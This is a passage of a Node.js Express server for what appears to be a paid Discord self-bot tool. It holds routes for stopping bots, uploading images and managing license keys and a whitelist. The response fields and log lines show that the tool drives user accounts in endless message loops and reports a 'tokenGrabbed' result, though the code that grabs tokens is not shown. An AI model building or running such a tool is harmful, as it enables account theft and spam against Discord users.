    // Start the loop
    msgLoop();

    res.json({
      success: true,
      username: client.user.username,
      configId,
      serverJoined: joinStatus?.success || false,
      tokenGrabbed: grabResult?.success || false,
      imageCount: savedImages.length,
      messageCount: messageList.length,
      delayMs,
      autoReplyEnabled: !!autoReply,
      autoReplyText: autoReplyText || null,
      tokenType: client.tokenType
    });
  } catch (err) {
    console.error('[BotStart] Error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.body;
    const botKey = `${req.user.id}_${configId}`;
    const bot = activeBots.get(botKey);
    if (bot) { bot.destroy(); activeBots.delete(botKey); }
    db.unregisterActiveBot(req.user.id, configId);
    const config = db.getConfig(req.user.id, configId);
    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
  catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
    const imageId = `img_${Date.now()}.png`;
    const imagePath = path.join(dataDir, 'uploads');
    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
    const base64Data = imageBase64.split(',')[1];
    if (!base64Data) return res.status(400).json({ success: false, error: 'Invalid image data' });
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(path.join(imagePath, imageId), buffer);
    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

// ═══════════════════════════════════════════════════════════════════════════════
// ADMIN ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
  const { duration } = req.body;
  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
  let dbDuration = duration;
  if (duration === '7d') dbDuration = '168';
  if (duration === '30d') dbDuration = '720';
  const keyData = db.generateKey(dbDuration);
  res.json({ success: true, key: keyData });
});

app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
  const success = db.revokeKey(key);
  res.json({ success });
});

app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });

// ═══════════════════════════════════════════════════════════════════════════════
// STATIC & FALLBACK ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.redirect('/login'); });
app.get('/dashboard', (req, res) => { if (!req.isAuthenticated()) return res.redirect('/login'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });

app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err);
  res.status(500).json({ error: err.message });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Discord Automation Suite v3.1 running on port ${PORT}`);
  console.log(`[SERVER] Using discord.js for bot tokens, discord.js-selfbot-v13 for user tokens`);
  console.log(`[SERVER] Fixed sequential message loop — 24/7 until stopped`);
});

module.exports = app;
app.db = db;
app.activeBots = activeBots;
